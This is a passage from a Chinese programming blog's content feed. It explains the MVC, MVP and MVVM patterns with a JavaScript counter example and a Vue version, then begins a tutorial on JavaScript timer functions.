function">createElement</span><span class="token punctuation">(</span><span class="token string">"div"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">const</span> elDisplay <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">"div"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">const</span> elButton <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">"button"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        elDisplay<span class="token punctuation">.</span>innerText <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">Current count: </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>text<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">;</span>        elButton<span class="token punctuation">.</span>innerText <span class="token operator">=</span> <span class="token string">"Add count"</span><span class="token punctuation">;</span>        elCounter<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>elDisplay<span class="token punctuation">)</span><span class="token punctuation">;</span>        elCounter<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>elButton<span class="token punctuation">)</span><span class="token punctuation">;</span>        body<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>elCounter<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 提供接口供控制器操作</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>elDisplay <span class="token operator">=</span> elDisplay<span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>elButton <span class="token operator">=</span> elButton<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>        <span class="token comment">// 更新视图自身内容的逻辑</span>    <span class="token function">updateView</span><span class="token punctuation">(</span><span class="token parameter">text</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>elDisplay<span class="token punctuation">.</span>innerText <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">Current count: </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>text<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">// 数据模型</span><span class="token keyword">class</span> <span class="token class-name">CounterModel</span> <span class="token punctuation">&#123;</span>    <span class="token function">constructor</span><span class="token punctuation">(</span><span class="token parameter">initValue</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>count <span class="token operator">=</span> initValue<span class="token punctuation">;</span>        <span class="token comment">// 维护观察者</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>observers <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// 获取数据</span>    <span class="token function">getCount</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>count<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// 改变数据</span>    <span class="token function">setCount</span><span class="token punctuation">(</span><span class="token parameter">value<span class="token punctuation">,</span> view</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>count <span class="token operator">=</span> value<span class="token punctuation">;</span>        <span class="token comment">// 通知观察者们更新</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>observers<span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span><span class="token parameter">view</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>            view<span class="token punctuation">.</span><span class="token function">updateView</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>        <span class="token comment">// 添加观察者</span>    <span class="token function">addObserver</span><span class="token punctuation">(</span><span class="token parameter">view</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>observers<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>view<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">// 控制器</span><span class="token keyword">class</span> <span class="token class-name">CounterController</span> <span class="token punctuation">&#123;</span>    <span class="token function">constructor</span><span class="token punctuation">(</span><span class="token parameter">model<span class="token punctuation">,</span> view</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>model <span class="token operator">=</span> model<span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>view <span class="token operator">=</span> view<span class="token punctuation">;</span>        <span class="token comment">// 给视图绑定事件监听</span>        view<span class="token punctuation">.</span>elButton<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span>            <span class="token string">"click"</span><span class="token punctuation">,</span>            <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">clickCallback</span><span class="token punctuation">.</span><span class="token function">bind</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span>        <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// 视图事件回调</span>    <span class="token function">clickCallback</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">const</span> count <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>model<span class="token punctuation">.</span><span class="token function">getCount</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 触发模型数据更新</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>model<span class="token punctuation">.</span><span class="token function">setCount</span><span class="token punctuation">(</span>count <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>view<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">// 建立视图</span><span class="token keyword">const</span> counterView <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">CounterView</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 建立模型</span><span class="token keyword">const</span> counterModel <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">CounterModel</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 添加视图为模型的观察者</span>counterModel<span class="token punctuation">.</span><span class="token function">addObserver</span><span class="token punctuation">(</span>counterView<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 建立控制器</span><span class="token keyword">const</span> counterController <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">CounterController</span><span class="token punctuation">(</span>    counterModel<span class="token punctuation">,</span>    counterView<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// Current count: 0</span><span class="token comment">// 模拟用户交互</span>counterView<span class="token punctuation">.</span>elButton<span class="token punctuation">.</span><span class="token function">click</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// Current count: 1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="MVP-模式"><a href="#MVP-模式" class="headerlink" title="MVP 模式"></a>MVP 模式</h2><p>MVP 模式（模型-<strong>Model</strong>，视图-<strong>View</strong>，展示器-<strong>Presenter</strong>）是 MVC 模式的一个衍生模式，不同于 MVC 中的 <strong>Controller</strong>，可能更侧重于处理视图层对模型层的操作逻辑，MVP 会更专注于提升展现逻辑，即 <strong>Presenter</strong> 的功能，通常它是一个包含视图层逻辑的组件，处理用户的交互请求，然后对模型中的数据进行读写等操作，数据更新后又将数据稍做处理，<strong>格式化展现</strong>到视图中，也因此 MVP 模式的的视图层几乎不再包含任何逻辑，通常被称作<strong>被动视图</strong>（Passive View）；</p><p>这种模式下展示器更像一个中介者，解耦视图与模型的相互关联，因此这也更易于进行单元测试，比如对指定视图状态的模拟；MVP 模式的整体结构有些类似下图：</p><pre class="line-numbers language-none"><code class="language-none">       交互回调                 更新数据View ------------&gt; Controller ------------&gt; Model     &lt;------------            &lt;------------        更新页面                 更新通知<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>沿用上面 MVC 模式的计数器例子，MVP 模式下可以改造成这样：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// 视图</span><span class="token keyword">class</span> <span class="token class-name">CounterView</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// 初始化视图</span>    <span class="token function">constructor</span><span class="token punctuation">(</span><span class="token parameter">text</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">const</span> body <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">querySelector</span><span class="token punctuation">(</span><span class="token string">"body"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">const</span> elCounter <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">"div"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">const</span> elDisplay <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">"div"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">const</span> elButton <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">"button"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        elDisplay<span class="token punctuation">.</span>innerText <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">Current count: </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>text<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">;</span>        elButton<span class="token punctuation">.</span>innerText <span class="token operator">=</span> <span class="token string">"Add count"</span><span class="token punctuation">;</span>        elCounter<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>elDisplay<span class="token punctuation">)</span><span class="token punctuation">;</span>        elCounter<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>elButton<span class="token punctuation">)</span><span class="token punctuation">;</span>        body<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>elCounter<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 提供接口供控制器操作</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>elDisplay <span class="token operator">=</span> elDisplay<span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>elButton <span class="token operator">=</span> elButton<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">// 数据模型</span><span class="token keyword">class</span> <span class="token class-name">CounterModel</span> <span class="token punctuation">&#123;</span>    <span class="token function">constructor</span><span class="token punctuation">(</span><span class="token parameter">initValue</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>count <span class="token operator">=</span> initValue<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// 获取数据</span>    <span class="token function">getCount</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>count<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// 改变数据</span>    <span class="token function">setCount</span><span class="token punctuation">(</span><span class="token parameter">value<span class="token punctuation">,</span> callback</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>count <span class="token operator">=</span> value<span class="token punctuation">;</span>                <span class="token comment">// 数据更新后执行的回调，这里就是通知展示器</span>        <span class="token function">callback</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">// 控制器</span><span class="token keyword">class</span> <span class="token class-name">CounterController</span> <span class="token punctuation">&#123;</span>    <span class="token function">constructor</span><span class="token punctuation">(</span><span class="token parameter">model<span class="token punctuation">,</span> view</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>model <span class="token operator">=</span> model<span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>view <span class="token operator">=</span> view<span class="token punctuation">;</span>        <span class="token comment">// 给视图绑定事件监听</span>        view<span class="token punctuation">.</span>elButton<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span>            <span class="token string">"click"</span><span class="token punctuation">,</span>            <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">clickCallback</span><span class="token punctuation">.</span><span class="token function">bind</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span>        <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>        <span class="token comment">// 更新视图</span>    <span class="token function">updateView</span><span class="token punctuation">(</span><span class="token parameter">value</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>view<span class="token punctuation">.</span>elDisplay<span class="token punctuation">.</span>innerText <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">Current count: </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>value<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>        <span class="token comment">// 更新模型</span>    <span class="token function">updateModel</span><span class="token punctuation">(</span><span class="token parameter">value<span class="token punctuation">,</span> callback</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>model<span class="token punctuation">.</span><span class="token function">setCount</span><span class="token punctuation">(</span>value<span class="token punctuation">,</span> callback<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// 视图事件回调</span>    <span class="token function">clickCallback</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">const</span> count <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>model<span class="token punctuation">.</span><span class="token function">getCount</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 触发模型更新</span>        <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">updateModel</span><span class="token punctuation">(</span>            count <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span>            <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">updateView</span><span class="token punctuation">.</span><span class="token function">bind</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span>        <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">// 建立视图</span><span class="token keyword">const</span> counterView <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">CounterView</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 建立模型</span><span class="token keyword">const</span> counterModel <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">CounterModel</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 建立控制器</span><span class="token keyword">const</span> counterController <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">CounterController</span><span class="token punctuation">(</span>    counterModel<span class="token punctuation">,</span>    counterView<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// Current count: 0</span><span class="token comment">// 模拟用户交互</span>counterView<span class="token punctuation">.</span>elButton<span class="token punctuation">.</span><span class="token function">click</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// Current count: 1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="MVVM-模式"><a href="#MVVM-模式" class="headerlink" title="MVVM 模式"></a>MVVM 模式</h2><p>MVVM 模式：（模型-<strong>Model</strong>，视图-<strong>View</strong>，视图模型-<strong>ViewModel</strong>）是一种基于 MVC 和 MVP 的衍生模式，它试图将视图层（用户界面，UI）从业务逻辑中更清晰地分析出来，使得 UI 和逻辑层的开发工作可以同时进行，UI 交互设计师负责绑定 View 与 ViewModel，专注于用户体验，而业务逻辑开发者负责维护 Model 与 ViewModel 的联系，专注于业务需求；MVVM 模式所呈现的结构类似下图：</p><pre class="line-numbers language-none"><code class="language-none">       双向绑定               改变数据View &lt;-----------&gt; ViewModel ----------&gt; Model                             &lt;----------                               数据展示 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>MVVM 模式最初由微软在 WPF（Windows Presentation Foundation，<code>.NET</code> 图形系统）中推出使用，视图层（View）与 MVC 和 MVP 中的视图一样，即用户所看见的页面结构和布局，能展示模型层的数据并接受用户的交互操作，只不过不再是被动视图，而是包含数据绑定与事件指令，是一种主动视图；</p><p>视图模型层（<strong>ViewModel</strong>）是 MVVM 与 MVC 和 MVP 形成区别的地方，它和 MVP 中的 <strong>Presenter</strong> 有些类似，包含状态与逻辑信息，负责沟通数据模型层与视图层，把数据信息转换并展示到视图层，同时也能将视图层的指令传递到模型层，或者对输入数据进行验证；视图通常使用一类标记语言或者约定的标记语法，实现与视图模型层的数据双向绑定，从而达到同步更新；</p><p>流行的 <strong>Vue</strong> 框架，就是典型的 MVVM 模式，下面通过 Vue 的语法，依然以前面的计数器为例进行简单说明：</p><p><code>index.html</code>：</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>Counter<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://cdn.jsdelivr.net/npm/vue@2.6.12<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>app<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">></span></span>Current count: &#123;&#123; count &#125;&#125;<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name"><span class="token namespace">v-on:</span>click</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>addCount<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Add count<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>./index.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里的 HTML 代码就可以看作视图层（View），由于框架层提供的特性，所以它相比于传统 HTML 代码有一些区别，就是使用了模板语法，能够直接在元素中使用数据变量（<code>&#123;&#123;count&#125;&#125;</code>），以及绑定事件（<code>v-on:click=&quot;addCount&quot;</code>），而这些都是之前所说的 MVVM 模式中视图层的特性；</p><p><code>index.js</code>：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">new</span> <span class="token class-name">Vue</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>    <span class="token literal-property property">el</span><span class="token operator">:</span> <span class="token string">'#app'</span><span class="token punctuation">,</span>    <span class="token literal-property property">data</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>        <span class="token literal-property property">count</span><span class="token operator">:</span> <span class="token number">0</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    <span class="token literal-property property">methods</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>        <span class="token function-variable function">addCount</span><span class="token operator">:</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">const</span> count <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>count<span class="token punctuation">;</span>            <span class="token keyword">this</span><span class="token punctuation">.</span>count <span class="token operator">=</span> count <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里的 JS 逻辑代码可以看作视图模型层（ViewModel），包含对数据的展示处理，以及视图的指令（事件）监听处理，当然，<code>data</code> 属性可以看作是模型层（Model），但一般大型应用而言，真正意义的数据模型通常是位于服务端，页面对数据的增删改查通过接口进行，客户端则一般只对数据进行临时性存储；</p><p>MVVM 与 MVC 以及 MVP 的<strong>区别</strong>之处在于，<strong>ViewModel</strong> 不用像 <strong>Controller</strong> 一样不做干预，将 Model 直接暴露给 View，也不像 <strong>Presenter</strong> 一样，需要去引用 View，视图模型只是让视图将展示绑定到自己的属性上，再将模型中的数据处理后暴露给视图；当然能够轻松的使用 MVVM 带来的各种松耦合的便利，都离不开隐藏在框架之下的复杂性的支持，比如如何具体实现视图层与视图模型层的双向绑定，指令监听等，所以使用时必然需要考虑这层复杂逻辑带来的性能损耗是否在预期范围内；</p>]]></content>
      
      
      <categories>
          
          <category> JavaScript </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 设计模式 design pattern </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JavaScript 计时器函数用法</title>
      <link href="/2024/09/27/javascript/javascript-ji-shi-qi-han-shu-yong-fa/"/>
      <url>/2024/09/27/javascript/javascript-ji-shi-qi-han-shu-yong-fa/</url>
      
        <content type="html"><![CDATA[<p>Javascript中和大多数语言一样，存在计时函数，使某语句或函数不用立即执行，可以延时设定的时间值之后再执行。</p><h1 id="setTimeout"><a href="#setTimeout" class="headerlink" title="setTimeout()"></a>setTimeout()</h1><p>这个函数表示括号中的代码，延时指定时间后再执行，格式为 <code>setTimeout(&quot;function()&quot;, time)</code>，其中 <code>time</code> 的单位是<strong>毫秒</strong>。</p><p>例如：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">fx</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token string">"fx()"</span><span class="token punctuation">,</span> <span class="token number">2000</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>也可以写成：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token function">setTimoeout</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token number">2000</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>结果就是页面加载完 2 秒后弹出提示框。</p><h1 id="clearTimeout"><a href="#clearTimeout" class="headerlink" title="clearTimeout()"></a>clearTimeout()</h1><p>clearTimeout() 方法用于结束 setTimeout() 方法的执行，括号中<strong>参数</strong>为 setTimeout() 返回的 <strong>ID 值</strong>。</p><p>举例说明：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> int1 <span class="token operator">=</span> <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token number">5000</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">clearTimeout</span><span class="token punctuation">(</span>int1<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>这样就能<strong>终止</strong>代码执行，不会弹出提示框。</p><h1 id="setInterval"><a href="#setInterval" class="headerlink" title="setInterval()"></a>setInterval()</h1><p>这个函数表示<strong>每隔</strong>指定时间间隔执行一次括号中的代码，格式为：<code>setInterval(&quot;function()&quot;, time)</code>， <code>time</code> 单位依然为毫秒。</p><p>例如：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">fx</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>document<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token string">"0"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">setInterval</span><span class="token punctuation">(</span><span class="token string">"fx()"</span><span class="token punctuation">,</span> <span class="token number">2000</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里就不要用 <code>alert()</code> 做实验了，后果你懂的 -_- .</p><p>同样也能写成：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token function">setInterval</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token 